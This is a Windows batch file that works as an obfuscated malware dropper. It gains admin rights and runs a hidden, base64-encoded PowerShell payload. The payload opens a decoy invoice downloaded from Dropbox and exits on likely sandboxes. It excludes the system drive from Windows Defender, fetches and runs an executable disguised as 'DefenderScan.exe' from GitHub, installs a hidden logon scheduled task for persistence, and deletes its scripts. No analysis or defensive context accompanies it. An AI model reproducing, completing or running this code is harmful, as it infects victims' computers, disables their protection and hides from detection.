@echo off
:: Check for administrator privileges
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting admin privileges...
    powershell.exe -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)

:: Create the PowerShell script in AppData\Local\Temp
set "ps_script=%temp%\runtime_script.ps1"
(
echo $encodedCommand = 'RgB1AG4AYwB0AGkAbwBuACAAVABlAHMAdAAtAEEAZABtAGkAbgAgAHsADQAKACAAIAAgACAAJABhAGQAbQBpAG4AQwBoAGUAYwBrACAAPQAgAFsAUwBlAGMAdQByAGkAdAB5AC4AUAByAGkAbgBjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAFAAcgBpAG4AYwBpAHAAYQBsAF0AIABbAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsAC4AVwBpAG4AZABvAHcAcwBJAGQAZQBuAHQAaQB0AHkAXQA6ADoARwBlAHQAQwB1AHIAcgBlAG4AdAAoACkADQAKACAAIAAgACAAcgBlAHQAdQByAG4AIAAkAGEAZABtAGkAbgBDAGgAZQBjAGsALgBJAHMASQBuAFIAbwBsAGUAKABbAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsAC4AVwBpAG4AZABvAHcAcwBCAHUAaQBsAHQASQBuAFIAbwBsAGUAXQAgACIAQQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgAiACkADQAKAH0ADQAKAA0ACgBpAGYAIAAoAC0ATgBvAHQAIAAoAFQAZQBzAHQALQBBAGQAbQBpAG4AKQApACAAewANAAoAIAAgACAAIAAkAHMAYwByAGkAcAB0AFAAYQB0AGgAIAA9ACAAJABNAHkASQBuAHYAbwBjAGEAdABpAG8AbgAuAE0AeQBDAG8AbQBtAGEAbgBkAC4AUABhAHQAaAANAAoAIAAgACAAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAcABvAHcAZQByAHMAaABlAGwAbAAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAAiAC0ATgBvAFAAcgBvAGYAaQBsAGUAIgAsACAAIgAtAEUAeABlAGMAdQB0AGkAbwBuAFAAbwBsAGkAYwB5ACIALAAgACIAQgB5AHAAYQBzAHMAIgAsACAAIgAtAEYAaQBsAGUAIgAsACAAIgBgACIAJABzAGMAcgBpAHAAdABQAGEAdABoAGAAIgAiACAALQBWAGUAcgBiACAAUgB1AG4AQQBzAA0ACgAgACAAIAAgAGUAeABpAHQADQAKAH0ADQAKAA0ACgAkAGcAaQByAGEAZgBmAGUAIAA9ACAAIgBoAHQAdABwAHMAOgAvAC8AdwB3AHcALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAGMAbAAvAGYAaQAvAG8AbAA4AHYAOQBjAGMAcgBzADgAMQA0AG0AZgAyAG0AcQBmAGsAMwB2AC8ASQBuAHYAbwBpAGMAZQAuAHAAZABmAD8AcgBsAGsAZQB5AD0AMwBiADEAYgAwADEAcwBwAHkAaABpADcAYwBxADcAbQBsAHAAYwBiAGIAZQBjADAAbgAmAHMAdAA9ADIAawBnAGcAbwB6AHQAcQAmAGQAbAA9ADEAIgANAAoAJABjAHUAcABjAGEAawBlACAAPQAgACIAJABlAG4AdgA6AFUAUwBFAFIAUABSAE8ARgBJAEwARQBcAEQAbwB3AG4AbABvAGEAZABzAFwASQBuAHYAbwBpAGMAZQAtADkAMQA2ADgAMwAxADAALgB6AGkAcABcAGkAbgB2AG8AaQBjAGUALgBwAGQAZgAiAA0ACgBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJABnAGkAcgBhAGYAZgBlACAALQBPAHUAdABGAGkAbABlACAAJABjAHUAcABjAGEAawBlAA0ACgBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIAAkAGMAdQBwAGMAYQBrAGUADQAKAA0ACgAkAHUAbQBiAHIAZQBsAGwAYQAgAD0AIABHAGUAdAAtAFcAbQBpAE8AYgBqAGUAYwB0ACAATQBTAEEAYwBwAGkAXwBUAGgAZQByAG0AYQBsAFoAbwBuAGUAVABlAG0AcABlAHIAYQB0AHUAcgBlACAALQBOAGEAbQBlAHMAcABhAGMAZQAgACIAcgBvAG8AdABcAHcAbQBpACIAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAC0ARQB4AHAAYQBuAGQAUAByAG8AcABlAHIAdAB5ACAAQwB1AHIAcgBlAG4AdABUAGUAbQBwAGUAcgBhAHQAdQByAGUADQAKAA0ACgBpAGYAIAAoAC0AbgBvAHQAIAAkAHUAbQBiAHIAZQBsAGwAYQApACAAewANAAoAIAAgACAAIABlAHgAaQB0AA0ACgB9AA0ACgANAAoAJABiAGEAbABsAG8AbwBuACAAPQAgACIAJABlAG4AdgA6AFMAeQBzAHQAZQBtAEQAcgBpAHYAZQBcACIADQAKAEEAZABkAC0ATQBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIAAtAEUAeABjAGwAdQBzAGkAbwBuAFAAYQB0AGgAIAAkAGIAYQBsAGwAbwBvAG4ADQAKACQAdwBoAGEAbABlACAAPQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBTAGMAcgBpAHAAdABqAHUAbgBrAGkAZQAxAC8AegB6AHoAegAvAHIAYQB3AC8AcgBlAGYAcwAvAGgAZQBhAGQAcwAvAG0AYQBpAG4ALwBEAGUAZgBlAG4AZABlAHIAUwBjAGEAbgAuAGUAeABlACIADQAKACQAbQBvAG8AbgAgAD0AIAAiACQAZQBuAHYAOgBUAEUATQBQAFwARABlAGYAZQBuAGQAZQByAFMAYwBhAG4ALgBlAHgAZQAiAA0ACgAkAHIAdQBuAHQAaQBtAGUAUwBjAHIAaQBwAHQAUABhAHQAaAAgAD0AIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAcgB1AG4AdABpAG0AZQBfAHMAYwByAGkAcAB0AC4AcABzADEAIgANAAoAJABzAGMAaABlAGQAdQBsAGUAZABUAGEAcwBrAFMAYwByAGkAcAB0AFAAYQB0AGgAIAA9ACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAHMAZQB0AF8AcwBjAGgAZQBkAHUAbABlAGQAXwB0AGEAcwBrAC4AcABzADEAIgANAAoAJABjAGwAZQBhAG4AdQBwAFMAYwByAGkAcAB0AFAAYQB0AGgAIAA9ACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAGMAbABlAGEAbgB1AHAAXwBzAGMAcgBpAHAAdAAuAHAAcwAxACIADQAKAA0ACgAkAHIAdQBuAHQAaQBtAGUAUwBjAHIAaQBwAHQAQwBvAG4AdABlAG4AdAAgAD0AIABAACIADQAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAHcAaABhAGwAZQAgAC0ATwB1AHQARgBpAGwAZQAgACQAbQBvAG8AbgANAAoADQAKAGkAZgAgACgAWwBTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAFcAaQBuAGQAbwB3AHMASQBkAGUAbgB0AGkAdAB5AF0AOgA6AEcAZQB0AEMAdQByAHIAZQBuAHQAKAApAC4ARwByAG8AdQBwAHMAIAAtAG0AYQB0AGMAaAAgACcAUwAtADEALQA1AC0AMwAyAC0ANQA0ADQAJwApACAAewANAAoAIAAgACAAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIAAkAG0AbwBvAG4AIAAtAFYAZQByAGIAIABSAHUAbgBBAHMADQAKAH0AIABlAGwAcwBlACAAewANAAoAIAAgACAAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIAAkAG0AbwBvAG4ADQAKAH0ADQAKAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIABwAG8AdwBlAHIAcwBoAGUAbABsACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgAEAAKAAnAC0ATgBvAFAAcgBvAGYAaQBsAGUAJwAsACAAJwAtAEUAeABlAGMAdQB0AGkAbwBuAFAAbwBsAGkAYwB5ACcALAAgACcAQgB5AHAAYQBzAHMAJwAsACAAJwAtAEYAaQBsAGUAJwAsACAAIgBgACIAJABzAGMAaABlAGQAdQBsAGUAZABUAGEAcwBrAFMAYwByAGkAcAB0AFAAYQB0AGgAYAAiACIAKQAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4ADQAKACIAQAANAAoADQAKACQAcgB1AG4AdABpAG0AZQBTAGMAcgBpAHAAdABDAG8AbgB0AGUAbgB0ACAAfAAgAFMAZQB0AC0AQwBvAG4AdABlAG4AdAAgAC0AUABhAHQAaAAgACQAcgB1AG4AdABpAG0AZQBTAGMAcgBpAHAAdABQAGEAdABoAA0ACgANAAoAJABzAGMAaABlAGQAdQBsAGUAZABUAGEAcwBrAFMAYwByAGkAcAB0AEMAbwBuAHQAZQBuAHQAIAA9ACAAQAAiAA0ACgBGAHUAbgBjAHQAaQBvAG4AIABTAGUAdAAtAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAIAB7AA0ACgAgACAAIAAgAFwAJABhAGMAdABpAG8AbgAgAD0AIABOAGUAdwAtAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAQQBjAHQAaQBvAG4AIAAtAEUAeABlAGMAdQB0AGUAIABcACQAbQBvAG8AbgANAAoAIAAgACAAIABcACQAdAByAGkAZwBnAGUAcgAgAD0AIABOAGUAdwAtAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAVAByAGkAZwBnAGUAcgAgAC0AQQB0AEwAbwBnAE8AbgANAAoAIAAgACAAIABcACQAcAByAGkAbgBjAGkAcABhAGwAIAA9ACAATgBlAHcALQBTAGMAaABlAGQAdQBsAGUAZABUAGEAcwBrAFAAcgBpAG4AYwBpAHAAYQBsACAALQBVAHMAZQByAEkAZAAgACIAQgBVAEkATABUAEkATgBcAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwAiACAALQBMAG8AZwBvAG4AVAB5AHAAZQAgAEkAbgB0AGUAcgBhAGMAdABpAHYAZQAgAC0AUgB1AG4ATABlAHYAZQBsACAASABpAGcAaABlAHMAdAANAAoADQAKACAAIAAgACAAXAAkAHQAYQBzAGsATgBhAG0AZQAgAD0AIAAiAEQAZQBmAGUAbgBkAGUAcgBTAGMAYQBuACAAYQB0ACAATABvAGcAbwBuACIADQAKACAAIAAgACAADQAKACAAIAAgACAAUgBlAGcAaQBzAHQAZQByAC0AUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawAgAC0AQQBjAHQAaQBvAG4AIABcACQAYQBjAHQAaQBvAG4AIAAtAFQAcgBpAGcAZwBlAHIAIABcACQAdAByAGkAZwBnAGUAcgAgAC0AUAByAGkAbgBjAGkAcABhAGwAIABcACQAcAByAGkAbgBjAGkAcABhAGwAIAAtAFQAYQBzAGsATgBhAG0AZQAgAFwAJAB0AGEAcwBrAE4AYQBtAGUAIAAtAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAgACIAUgB1AG4AcwAgAEQAZQBmAGUAbgBkAGUAcgBTAGMAYQBuAC4AZQB4AGUAIAB3AGkAdABoACAAYQBkAG0AaQBuACAAcAByAGkAdgBpAGwAZQBnAGUAcwAgAG8AbgAgAHUAcwBlAHIAIABsAG8AZwBvAG4AIgANAAoAfQANAAoADQAKAFMAZQB0AC0AUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawANAAoADQAKAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIABwAG8AdwBlAHIAcwBoAGUAbABsACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgAEAAKAAnAC0ATgBvAFAAcgBvAGYAaQBsAGUAJwAsACAAJwAtAEUAeABlAGMAdQB0AGkAbwBuAFAAbwBsAGkAYwB5ACcALAAgACcAQgB5AHAAYQBzAHMAJwAsACAAJwAtAEYAaQBsAGUAJwAsACAAIgBgACIAJABjAGwAZQBhAG4AdQBwAFMAYwByAGkAcAB0AFAAYQB0AGgAYAAiACIAKQAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4ADQAKACIAQAANAAoADQAKACQAcwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBTAGMAcgBpAHAAdABDAG8AbgB0AGUAbgB0ACAAfAAgAFMAZQB0AC0AQwBvAG4AdABlAG4AdAAgAC0AUABhAHQAaAAgACQAcwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBTAGMAcgBpAHAAdABQAGEAdABoAA0ACgAkAGMAbABlAGEAbgB1AHAAUwBjAHIAaQBwAHQAQwBvAG4AdABlAG4AdAAgAD0AIABAACIADQAKAA0ACgBGAHUAbgBjAHQAaQBvAG4AIABDAGwAZQBhAG4ALQBVAHAAUwBjAHIAaQBwAHQAcwAgAHsADQAKACAAIAAgACAAXAAkAHQAZQBtAHAAUABhAHQAaAAgAD0AIAAiAFwAJABlAG4AdgA6AFQARQBNAFAAIgANAAoAIAAgACAAIAANAAoAIAAgACAAIABHAGUAdAAtAEMAaABpAGwAZABJAHQAZQBtACAALQBQAGEAdABoACAAXAAkAHQAZQBtAHAAUABhAHQAaAAgAC0ARgBpAGwAdABlAHIAIAAiACoALgBwAHMAMQAiACAAfAAgAFIAZQBtAG8AdgBlAC0ASQB0AGUAbQAgAC0ARgBvAHIAYwBlACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlAA0ACgANAAoAfQANAAoADQAKAEMAbABlAGEAbgAtAFUAcABTAGMAcgBpAHAAdABzAA0ACgAiAEAADQAKAA0ACgAkAGMAbABlAGEAbgB1AHAAUwBjAHIAaQBwAHQAQwBvAG4AdABlAG4AdAAgAHwAIABTAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAtAFAAYQB0AGgAIAAkAGMAbABlAGEAbgB1AHAAUwBjAHIAaQBwAHQAUABhAHQAaAANAAoAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAHAAbwB3AGUAcgBzAGgAZQBsAGwAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAQAAoACcALQBOAG8AUAByAG8AZgBpAGwAZQAnACwAIAAnAC0ARQB4AGUAYwB1AHQAaQBvAG4AUABvAGwAaQBjAHkAJwAsACAAJwBCAHkAcABhAHMAcwAnACwAIAAnAC0ARgBpAGwAZQAnACwAIAAiAGAAIgAkAHIAdQBuAHQAaQBtAGUAUwBjAHIAaQBwAHQAUABhAHQAaABgACIAIgApACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgANAAoA'
echo powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $encodedCommand
) > "%ps_script%"

:: Execute the PowerShell script as admin
powershell -ExecutionPolicy Bypass -File "%ps_script%" -WindowStyle Hidden

exit
